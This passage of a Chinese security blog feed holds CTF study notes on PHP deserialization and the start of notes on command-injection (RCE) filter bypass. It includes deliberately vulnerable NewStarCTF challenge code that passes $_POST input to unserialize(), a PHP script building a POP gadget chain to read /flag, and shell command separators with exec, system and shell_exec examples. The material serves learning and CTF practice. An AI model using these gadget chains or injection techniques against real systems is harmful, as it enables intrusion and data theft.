<code>true</code> 或 <code>false</code></td><td><code>b:1;</code>（true），<code>b:0;</code>（false）</td></tr><tr><td><code>i</code></td><td><code>integer</code></td><td>整数</td><td><code>i:123;</code></td></tr><tr><td><code>d</code></td><td><code>double</code>（浮点数）</td><td>浮点数</td><td><code>d:3.14;</code></td></tr><tr><td><code>s</code></td><td><code>string</code></td><td>字符串（包含长度）</td><td><code>s:5:&quot;Alice&quot;;</code></td></tr><tr><td><code>a</code></td><td><code>array</code></td><td>数组（键值对存储）</td><td><code>a:2:&#123;s:4:&quot;name&quot;;s:5:&quot;Alice&quot;;s:3:&quot;age&quot;;i:25;&#125;</code></td></tr><tr><td><code>O</code></td><td><code>object</code></td><td>对象（包含类名和属性）</td><td><code>O:4:&quot;User&quot;:1:&#123;s:4:&quot;name&quot;;s:3:&quot;Bob&quot;;&#125;</code></td></tr><tr><td><code>R</code></td><td><code>reference</code>（引用）</td><td>引用（指向之前的变量）</td><td><code>R:1;</code></td></tr><tr><td><code>C</code></td><td><code>custom object</code></td><td>对象自定义序列化（<code>Serializable</code> 接口）</td><td><code>C:8:&quot;MyClass&quot;:9:&#123;datahere&#125;</code></td></tr></tbody></table><p><strong>在Private 权限私有属性序列化的时候格式是 %00类名%00属性名</strong></p><p> <em><em>在Protected 权限序列化的时候格式是 %00</em>%00属性名</em>*</p><p><strong>对象的方法不会被序列化</strong></p><h4 id="序列化对象例子（Object）"><a href="#序列化对象例子（Object）" class="headerlink" title="序列化对象例子（Object）"></a>序列化对象例子（Object）</h4><p>1. </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$password</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sayHello</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello, &quot;</span> . <span class="hljs-variable language_">$this</span>-&gt;name;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$user</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;Alice&quot;</span>, <span class="hljs-string">&quot;secret123&quot;</span>);<br><span class="hljs-variable">$serialized</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$user</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$serialized</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><strong>输出：</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;User&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;Alice&quot;</span>;s:<span class="hljs-number">12</span>:<span class="hljs-string">&quot;Userpassword&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;secret123&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><ul><li><code>O:4:&quot;User&quot;</code> → 这是一个对象（Object），类名是 <code>&quot;User&quot;</code>（长度 4）。</li><li><code>2</code> → 该对象有 2 个属性（<code>public $name</code> 和 <code>private $password</code>）。</li><li><code>s:4:&quot;name&quot;;s:5:&quot;Alice&quot;;</code> → <code>public $name</code> 的值是 <code>&quot;Alice&quot;</code>。</li><li><code>s:12:&quot;Userpassword&quot;;s:9:&quot;secret123&quot;;</code> → <code>private $password</code> 的值是 <code>&quot;secret123&quot;</code>。</li></ul><p>🔹 <strong>但 <code>sayHello()</code> 方法并没有出现在序列化结果中</strong>，说明方法不会被序列化。</p><p>2. </p><p><strong>在反序列化的时候要保证有该类存在，因为没有序列化方法，所以我们反序列化回来还要依靠该类的方法进行。</strong></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-04-07_16-35-07.png" alt="PixPin_2025-04-07_16-35-07"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-04-07_16-35-17.png" alt="PixPin_2025-04-07_16-35-17"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-04-07_16-35-25.png" alt="PixPin_2025-04-07_16-35-25"></p><p><strong>为什么要序列化对象成字符串呢？在开发中又起到什么作用？</strong></p><p>因为PHP文件执行后会把内存的数据进行销毁，如果下一个文件想用到刚刚销毁对象的<strong>属性</strong>和<strong>值</strong>就还要重新实例化new一次对象，所以才会将对象进行序列化然后存储，也避免重新实例化带来的耗费。</p><p>3. </p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-04-02_16-35-11.png" alt="PixPin_2025-04-02_16-35-11"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-04-02_16-36-03.png" alt="PixPin_2025-04-02_16-36-03"></p><h2 id="什么是魔术方法"><a href="#什么是魔术方法" class="headerlink" title="什么是魔术方法"></a>什么是魔术方法</h2><p>魔术方法是一种特殊的方法，会在对象执行某些操作时覆盖PHP的默认操作</p><p>常用的：</p><p><a href="https://zhuanlan.zhihu.com/p/377676274">https://zhuanlan.zhihu.com/p/377676274</a></p><table><thead><tr><th align="left">魔术方法名称</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">__sleep()</td><td align="left">serialize() 时调用</td></tr><tr><td align="left">__wakeup()</td><td align="left">unserialize() 时调用</td></tr><tr><td align="left">__toString()</td><td align="left">用于一个对象被当成字符串时调用</td></tr><tr><td align="left">__invoke()</td><td align="left">当尝试以调用函数的方式调用一个对象时</td></tr><tr><td align="left">__construct()</td><td align="left">构造函数，每次创建新对象时先调用此方法  (但在unserialize()时是不会自动调用的)。</td></tr><tr><td align="left">__destruct()</td><td align="left">析构函数，某个对象的所有引用都被删除或者当对象被显式销毁时执行</td></tr><tr><td align="left">__set()</td><td align="left">在给不可访问（protected 或 private）或不存在的属性赋值时</td></tr><tr><td align="left">__get()</td><td align="left">读取不可访问（protected 或 private）或不存在的属性的值时</td></tr><tr><td align="left">__call()</td><td align="left">当对象调用一个不可访问方法时</td></tr></tbody></table><p> __toString 触发的条件比较多，也因为这个原因容易被忽略，常见的触发条件有下面几种</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">(1)<span class="hljs-built_in">echo</span> (<span class="hljs-variable">$obj</span>) / <span class="hljs-built_in">print</span>(<span class="hljs-variable">$obj</span>) 打印时会触发<br><br>(2)反序列化对象与字符串连接时<br><br>(3)反序列化对象参与格式化字符串时<br><br>(4)反序列化对象与字符串进行==比较时（PHP进行==比较的时候会转换参数类型）<br><br>(5)反序列化对象参与格式化SQL语句，绑定参数时<br><br>(6)反序列化对象在经过php字符串函数，如 strlen()、addslashes()时<br><br>(7)在in_array()方法中，第一个参数是反序列化对象，第二个参数的数组中有toString返回的字符串的时候toString会被调用<br><br>(8)反序列化的对象作为 class_exists() 的参数的时候<br></code></pre></td></tr></table></figure><p>魔术方法总结</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-04-07_16-40-09.png"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-04-07_16-40-18.png" alt="PixPin_2025-04-07_16-40-18"></p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h2 id="反序列化漏洞的成因："><a href="#反序列化漏洞的成因：" class="headerlink" title="反序列化漏洞的成因："></a>反序列化漏洞的成因：</h2><p>在 PHP 反序列化的过程中，如果 <code>unserialize()</code> 处理的是<strong>用户可控的输入</strong>，那么攻击者就可以伪造对象的序列化字符串，<strong>修改</strong>原有类的<strong>属性值</strong>，甚至<strong>触发</strong>类中的<strong>魔术方法</strong>，从而执行任意代码。</p><p><strong>反序列化漏洞是由于unserialize函数接收到了恶意的序列化数据篡改成员属性后导致的。</strong></p><h2 id="NewStarCTF-公开赛赛道-UnserializeOne"><a href="#NewStarCTF-公开赛赛道-UnserializeOne" class="headerlink" title="[NewStarCTF 公开赛赛道]UnserializeOne"></a>[NewStarCTF 公开赛赛道]UnserializeOne</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Start</span></span>&#123;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>  <span class="hljs-keyword">protected</span> <span class="hljs-variable">$func</span>;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Welcome to NewStarCTF, &quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;name;<br>  &#125;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__isset</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>)</span><br><span class="hljs-function">  </span>&#123;<br>    (<span class="hljs-variable language_">$this</span>-&gt;func)();<br>  &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Sec</span></span>&#123;<br>  <span class="hljs-keyword">private</span> <span class="hljs-variable">$obj</span>;<br>  <span class="hljs-keyword">private</span> <span class="hljs-variable">$var</span>;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;<span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">var</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;CTFers&quot;</span>;<br>  &#125;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>);<br>  &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Easy</span></span>&#123;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$cla</span>;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$fun</span>, <span class="hljs-variable">$var</span></span>)</span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-variable language_">$this</span>-&gt;cla = <span class="hljs-keyword">clone</span> <span class="hljs-variable">$var</span>[<span class="hljs-number">0</span>];<br>  &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">eeee</span></span>&#123;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__clone</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;obj-&gt;cmd))&#123;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;success&quot;</span>;<br>    &#125;<br>  &#125;<br>&#125;<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]))&#123;<br>  <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><ol><li><code>Start</code><ul><li>析构方法 <code>__destruct()</code>：输出 <code>Welcome to NewStarCTF, $this-&gt;name;</code></li><li><code>__isset()</code> 方法：会调用 <code>$this-&gt;func</code> 这个属性</li></ul></li><li><code>Sec</code><ul><li><code>__toString()</code> 方法：调用 <code>$this-&gt;obj-&gt;check($this-&gt;var);</code></li><li><code>__invoke()</code> 方法：读取 <code>/flag</code> 并输出。</li></ul></li><li><code>Easy</code><ul><li><code>__call()</code> 魔术方法：<code>$this-&gt;cla = clone $var[0];</code>（调用时克隆 <code>$var[0]</code>）</li></ul></li><li><code>eeee</code><ul><li><code>__clone()</code> 方法：检查 <code>$this-&gt;obj-&gt;cmd</code> 是否存在。</li></ul></li></ol><p>目标是 <strong>触发 <code>Sec</code> 类的 <code>__invoke()</code> 方法</strong>，这样可以 <code>file_get_contents(&#39;/flag&#39;)</code> 读取 flag。</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs livescript">要 触发 Sec 类的 `__invoke()` 方法-&gt;把对象当作函数调用：-&gt;Start类的_isset方法：把Sec类当作func属性<br><br>-&gt;触发isset方法-&gt;<span class="hljs-keyword">class</span> <span class="hljs-title class_">eeee</span>类的__clone方法-&gt;<span class="hljs-keyword">class</span> <span class="hljs-title class_">Easy</span>-&gt;触发call-&gt;<span class="hljs-keyword">class</span> <span class="hljs-title class_">Sec</span>-&gt;__toString-&gt;<span class="hljs-keyword">class</span> <span class="hljs-title class_">Start</span>的__destruct<br></code></pre></td></tr></table></figure><p>后续就是编写exp</p><p>先将代码复制进vscode，然后把所有和属性无关的删除。</p><p>private的属性改成public 缺的属性补全</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Start</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>&#125;<br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Sec</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;<br>&#125;<br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Easy</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cla</span>;<br>&#125;<br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">eeee</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>;<br>&#125;<br> <br><span class="hljs-variable">$res</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Start</span>;<br><span class="hljs-variable">$res</span>-&gt;name = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Sec</span>;<span class="hljs-comment">//第一条链</span><br><span class="hljs-variable">$res</span>-&gt;name-&gt;obj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Easy</span>;<span class="hljs-comment">//第二条链</span><br><span class="hljs-variable">$res</span>-&gt;name-&gt;<span class="hljs-keyword">var</span>=<span class="hljs-keyword">new</span> eeee;<span class="hljs-comment">//第三条链</span><br><span class="hljs-variable">$res</span>-&gt;name-&gt;<span class="hljs-keyword">var</span>-&gt;obj=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Start</span>;<span class="hljs-comment">//第四条链</span><br><span class="hljs-variable">$res</span>-&gt;name-&gt;<span class="hljs-keyword">var</span>-&gt;obj-&gt;func=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Sec</span>;<span class="hljs-comment">//第五条链</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$res</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="NewStarCTF-2023-公开赛道-POP-Gadget"><a href="#NewStarCTF-2023-公开赛道-POP-Gadget" class="headerlink" title="[NewStarCTF 2023 公开赛道]POP Gadget"></a>[NewStarCTF 2023 公开赛道]POP Gadget</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Begin</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="hljs-variable">$this</span>-&gt;name))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hello&quot;</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Welcome to NewStarCTF 2023!&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Then</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$func</span>;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        (<span class="hljs-variable language_">$this</span>-&gt;func)();<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Good Job!&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Handle</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$obj</span>;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$vars</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;<span class="hljs-title function_ invoke__">end</span>();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Super</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$obj</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;<span class="hljs-title function_ invoke__">getStr</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">end</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;==GAME OVER==&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CTF</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$handle</span>;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">end</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">unset</span>(<span class="hljs-variable language_">$this</span>-&gt;handle-&gt;log);<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WhiteGod</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unset</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        (<span class="hljs-variable language_">$this</span>-&gt;func)(<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">var</span>);    <br>    &#125;<br>&#125;<br>@<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>入手点： ($this-&gt;func)($this-&gt;var); 可以执行任意命令</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-title class_">WhiteGod</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:_unset-&gt;CTF</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:end-&gt;Handle</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:_call-&gt;Super</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:_invoke-&gt;Then</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:toString-&gt;Begin</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:__destruct</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
      <category>基础知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>php反序列化</tag>
      
      <tag>pop链构造</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RCE（任意命令执行）绕过</title>
    <link href="/2025/04/06/RCE%EF%BC%88%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%89%E7%BB%95%E8%BF%87/"/>
    <url>/2025/04/06/RCE%EF%BC%88%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%89%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<h1 id="RCE（任意命令执行）绕过"><a href="#RCE（任意命令执行）绕过" class="headerlink" title="RCE（任意命令执行）绕过"></a>RCE（任意命令执行）绕过</h1><h2 id="操作系统连接符"><a href="#操作系统连接符" class="headerlink" title="操作系统连接符"></a>操作系统连接符</h2><p>分号；：多个命令无论对错顺序执行</p><p>&amp;&amp;：前面命令执行不成功后面命令无法执行</p><p>&amp;：用于依次执行多个命令，无论前一个命令是否成功。</p><p>管道输出符|：前面命令的输出作为后面命令的输入，把前面命令的结果作为后面命令的参数;前面后面的命令都执行，但是只显示后面的命令执行结果。</p><p>||：前面的命令执行成功，则后面的命令不会执行；前面的命令执行失败，则后面的命令执行</p><h2 id="程序执行函数"><a href="#程序执行函数" class="headerlink" title="程序执行函数"></a>程序执行函数</h2><p>os.system()</p><p>subprocess.Popen()</p><h3 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h3><p><strong>示例exec(“cat &#x2F;flag”)</strong></p><p>exec(<a href="https://www.php.net/manual/zh/language.types.string.php">string</a> <code>$command</code>, <a href="https://www.php.net/manual/zh/language.types.array.php">array</a> <code>&amp;$output</code> &#x3D; <strong><code>null</code></strong>, <a href="https://www.php.net/manual/zh/language.types.integer.php">int</a> <code>&amp;$result_code</code> &#x3D; <strong><code>null</code></strong>): <a href="https://www.php.net/manual/zh/language.types.string.php">string</a>|<a href="https://www.php.net/manual/zh/language.types.value.php">false</a></p><p>exec() 执行 <code>command</code> 参数所指定的命令。</p><p>如果提供了 <code>output</code> 参数， 那么会用命令执行的输出填充此数组， 每行输出填充数组中的一个元素。</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">exec</span>()` 函数用于执行 shell 命令，但不会直接输出执行结果，它的返回值只是命令的最后一行输出，而不是完整的输出。如果你需要完整的执行结果，可以使用 `<span class="hljs-built_in">exec</span>()` 的第二个参数或 `<span class="hljs-built_in">shell_exec</span>()<br></code></pre></td></tr></table></figure><p>返回值</p><p>命令执行结果的最后一行内容。</p><h3 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec"></a>shell_exec</h3><p>shell_exec — 通过 shell 执行命令并将完整的输出以字符串的方式返回</p><p>示例：<strong>shell_exec（ls）</strong>  shell_exec(ls | tee 1.txt)</p><p>不能自己回显，需要print_r等输出内容</p><h3 id="system"><a href="#system" class="headerlink" title="system"></a>system</h3><p>执行外部程序，并且显示输出</p><p>示例：<strong>system（’ls’）</strong></p><h3 id="passthru"><a href="#passthru" class="headerlink" title="passthru"></a>passthru</h3><p>同 <a href="https://www.php.net/manual/zh/function.exec.php">exec()</a> 函数类似， <strong>passthru()</strong> 函数 也是用来执行外部命令的。 </p><p>想让 <code>passthru()</code> <strong>直接输出到网页，同时存入变量</strong>，可以用 